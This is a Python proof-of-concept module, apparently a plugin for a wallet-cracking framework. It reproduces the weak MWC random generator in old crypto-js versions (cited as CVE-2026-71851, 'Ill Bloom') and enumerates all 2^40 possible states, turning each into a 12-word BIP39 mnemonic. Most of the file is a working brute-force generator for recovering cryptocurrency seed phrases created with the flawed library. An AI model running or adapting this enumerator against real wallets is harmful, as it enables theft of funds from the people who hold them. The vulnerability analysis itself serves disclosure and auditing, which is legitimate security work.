"""
CryptoJS Ill Bloom (CVE-2026-71851) — BIP39 mnemonic enumerator

Reproduction logic (crypto-js v3.1.2-4 ~ v3.x, src/core.js WordArray.random):
    random: function (nBytes) {
        var words = [];
        var r = (function (m_w) {
            var m_w = m_w;
            var m_z = 0x3ade68b1;
            var mask = 0xffffffff;
            return function () {
                m_z = (0x9069 * (m_z & 0xFFFF) + (m_z >> 0x10)) & mask;
                m_w = (0x4650 * (m_w & 0xFFFF) + (m_w >> 0x10)) & mask;
                var result = ((m_z << 0x10) + m_w) & mask;
                result /= 0x100000000;
                result += 0.5;
                return result * (Math.random() > .5 ? 1 : -1);
            }
        });
        for (var i = 0, rcache; i < nBytes; i += 4) {
            var _r = r((rcache || Math.random()) * 0x100000000);
            rcache = _r() * 0x3ade67b7;
            words.push((_r() * 0x100000000) | 0);
        }
        return new WordArray.init(words, nBytes);
    }

Vulnerability analysis:
    - Math.random() initializes m_w: 32-bit seed (first call)
    - Math.random() > .5: appends 1-bit sign to each MWC output
    - Generating 128-bit (4 words): each word requires 2 MWC calls, each with 1 bit sign
    - Effective entropy: 32 bit (seed) + 8 bit (4 words x 2 signs) = ~40 bit
    - But rcache propagation makes subsequent words deterministically linked to the first seed
    - True effective space: 2^32 (seed) x 2^8 (signs) = 2^40 ~ 1.1 x 10^12

    Coinspect/Ill Bloom determined: ~2^39 for 128-bit, ~2^47 for 256-bit

Impact:
    - ferrumnet/bip39 fork (React Native wallets)
    - Other apps using CryptoJS.lib.WordArray.random(16) to generate BIP39 entropy
    - $5M+ stolen (disclosed 2026-07-06)
    - Affected versions: crypto-js 3.1.2-4 ~ 3.x (except 3.2.0/3.2.1)
    - Fixed version: 4.0.0 (2020-02)

Source references:
    https://github.com/brix/crypto-js/issues/7
    https://github.com/brix/crypto-js/commit/ff1f003
    https://illbloom.org/articles/cryptojs-vulnerability/
    CVE-2026-71851
"""
import sys
import os
import struct
from hashlib import sha256
from typing import Iterator, Optional, Tuple

HERE = os.path.dirname(os.path.abspath(__file__))
from base import PocGenerator

sys.path.insert(0, os.path.join(HERE, "..", "..", "coldcard", "yasmarang_bypass"))
from ngu.bip39 import wordlist_en as BIP39_WORDLIST


MASK32 = 0xFFFFFFFF


def to_int32(val):
    """Replicate JavaScript's ToInt32 (used by bitwise | 0)"""
    # First truncate toward zero (like JS Math.trunc)
    n = int(val)
    # Then modulo 2^32 to get unsigned
    n = n % (2**32)
    # Then convert to signed 32-bit
    if n >= 2**31:
        n -= 2**32
    return n


def to_uint32(val):
    """Replicate JavaScript's ToUint32 (used by >>> 0)"""
    n = int(val)
    return n % (2**32)


def mwc_create(m_w_init):
    """Create a MWC generator instance, faithful port of CryptoJS.
    
    CRITICAL: JavaScript's bitwise operations ALL work on signed int32.
    The & mask in JS does NOT convert to unsigned — a negative int32
    ANDed with 0xFFFFFFFF stays negative in JS!
    
    The division `result /= 0x100000000` then produces a NEGATIVE float
    when result has bit 31 set, which fundamentally changes the output.
    """
    # JS stores m_w/m_z as signed int32 after bitwise ops
    state = {'m_w': to_int32(m_w_init), 'm_z': to_int32(0x3ade68b1)}

    def next_float(sign_bit: int) -> float:
        m_z = state['m_z']
        m_w = state['m_w']
        
        # JS: m_z = (0x9069 * (m_z & 0xFFFF) + (m_z >> 0x10)) & mask
        # (m_z & 0xFFFF) extracts low 16 bits (always 0..65535)
        # (m_z >> 0x10) is arithmetic right shift (sign-extends)
        low_z = m_z & 0xFFFF
        high_z = m_z >> 16  # Python arithmetic shift on negative = sign extends
        m_z = to_int32((0x9069 * low_z + high_z))
        
        low_w = m_w & 0xFFFF
        high_w = m_w >> 16
        m_w = to_int32((0x4650 * low_w + high_w))
        
        # JS: ((m_z << 0x10) + m_w) & mask
        # << 16 on signed int32 in JS: takes ToInt32, shifts, returns signed int32
        # The result can be negative!
        shifted_z = to_int32(m_z << 16)  # JS << returns signed int32
        result = to_int32(shifted_z + m_w)  # addition in signed int32 space
        
        # JS: result /= 0x100000000 — divides the SIGNED int32 by 2^32
        # This gives a float in [-0.5, 0.5)
        flt = result / 0x100000000
        # JS: result += 0.5 — shifts to [0, 1) ... wait, [-0.5+0.5, 0.5+0.5) = [0, 1)
        # Actually: signed int32 range is [-2^31, 2^31-1], divided by 2^32 = [-0.5, 0.5)
        # After +0.5: [0, 1)
        flt += 0.5
        
        sign = 1 if sign_bit else -1
        
        state['m_z'] = m_z
        state['m_w'] = m_w
        return flt * sign

    return next_float


def generate_entropy_128(seed: int, sign_bits: int) -> bytes:
    """
    Given a 32-bit seed and 8-bit sign selection, exactly reproduce CryptoJS WordArray.random(16).

    sign_bits: 8 bits, every 2 bits correspond to the sign choices for one word's two MWC calls
    Layout: [word0_call1, word0_call2, word1_call1, word1_call2, ...]
    """
    words = []
    rcache = 0.0

    for i in range(4):
        if i == 0:
            # JS: r((rcache || Math.random()) * 0x100000000)
            # First iteration: rcache is 0 (falsy), so uses seed directly
            m_w_init = seed
        else:
            # JS: (rcache * 0x100000000) | 0  — ToInt32 of float product
            m_w_init = to_int32(rcache * 0x100000000)

        mwc = mwc_create(m_w_init)

        sign_idx = i * 2
        s1 = (sign_bits >> (7 - sign_idx)) & 1
        s2 = (sign_bits >> (7 - sign_idx - 1)) & 1

        # JS: rcache = _r() * 0x3ade67b7  (float multiplication, no int conversion)
        rcache_float = mwc(s1)
        rcache = rcache_float * 0x3ade67b7

        # JS: (_r() * 0x100000000) | 0  — ToInt32 then stored as word
        word_float = mwc(s2)
        word_int32 = to_int32(word_float * 0x100000000)
        # Convert signed int32 to unsigned for struct packing
        words.append(word_int32 & MASK32)

    return struct.pack('>4I', *words)


def entropy_to_mnemonic_12(entropy_bytes: bytes) -> str:
    """BIP-39: 16 bytes (128 bit) -> 12-word mnemonic"""
    h = sha256(entropy_bytes).digest()
    b = int.from_bytes(entropy_bytes, 'big')
    checksum_bits = (h[0] >> 4) & 0x0F
    combined = (b << 4) | checksum_bits
    words = []
    for i in range(11, -1, -1):
        idx = (combined >> (i * 11)) & 0x7FF
        words.append(BIP39_WORDLIST[idx])
    return ' '.join(words)


# Total space: 2^32 seeds x 2^8 sign combinations = 2^40
# We encode as: index = seed * 256 + sign_bits
TOTAL_SPACE = 2**32 * 256  # 2^40 = 1,099,511,627,776


class IllBloomGenerator(PocGenerator):
    """
    Enumerate all 2^40 possible states of the CryptoJS MWC PRNG,
    each deterministically producing one 12-word BIP-39 mnemonic.

    Effective entropy: ~39-40 bit (32-bit seed + 8-bit sign choices)
    Risk level: critical (<=40 bit, $5M+ stolen)
    CVE: CVE-2026-71851 (Ill Bloom)
    """

    @property
    def poc_id(self) -> str:
        return "ill_bloom"

    @property
    def poc_name(self) -> str:
        return "CryptoJS Ill Bloom MWC weak PRNG (CVE-2026-71851)"

    @property
    def total_space(self) -> int:
        return TOTAL_SPACE

    @property
    def batch_size(self) -> int:
        return 10000

    def generate(self, start_index: int) -> Iterator[Tuple[int, Optional[str]]]:
        for idx in range(start_index, TOTAL_SPACE):
            seed = idx >> 8
            sign_bits = idx & 0xFF
            entropy = generate_entropy_128(seed, sign_bits)
            mnemonic = entropy_to_mnemonic_12(entropy)
            yield (idx, mnemonic)
